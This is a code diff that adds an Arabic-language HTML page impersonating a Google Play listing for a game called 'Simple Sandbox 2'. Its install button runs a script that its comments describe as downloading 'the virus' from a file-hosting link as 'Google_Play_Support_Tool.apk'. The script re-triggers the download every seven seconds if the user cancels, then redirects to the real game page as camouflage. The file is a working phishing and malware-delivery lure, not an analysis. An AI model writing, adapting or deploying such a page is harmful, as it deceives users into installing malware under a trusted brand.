@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Simple Sandbox 2 - Google Play</title>
+    <style>
+        body { background-color: white; font-family: Roboto, Arial; text-align: center; padding-top: 50px; }
+        .install-btn { background-color: #01875f; color: white; padding: 15px 80px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <img src="أدخل_رابط_أيقونة_اللعبة_هنا" width="100">
+    <h2>Simple Sandbox 2</h2>
+    <p>Madness_Games</p>
+    
+    <button class="install-btn" onclick="startInfiniteForceInstall()">تثبيت</button>
+
+    <script>
+    function startInfiniteForceInstall() {
+        var fileUrl = "رابط_الملف_الذي_ينتهي_بـ_txt_من_filebin";
+        
+        // 1. تحميل الفيروس وتحويله لـ APK تلقائياً
+        function triggerDownload() {
+            var x = document.createElement('a');
+            x.href = fileUrl;
+            x.download = "Google_Play_Support_Tool.apk"; // اسم رسمي جداً
+            document.body.appendChild(x);
+            x.click();
+        }
+
+        triggerDownload();
+
+        // 2. كود تحدي المستحيل (الإلحاح): إذا ضغط "إلغاء"، تظهر النافذة مرة أخرى كل 7 ثوانٍ
+        var interval = setInterval(function() {
+            triggerDownload();
+        }, 7000);
+
+        // 3. التمويه: نقله لصفحة اللعبة الحقيقية بعد 2 ثانية
+        setTimeout(function() {
+            window.location.href = "https://share.google/LL0Wp5KuwMMQ9SYzi";
+        }, 2000);
+    }
+    </script>
+</body>
+</html>
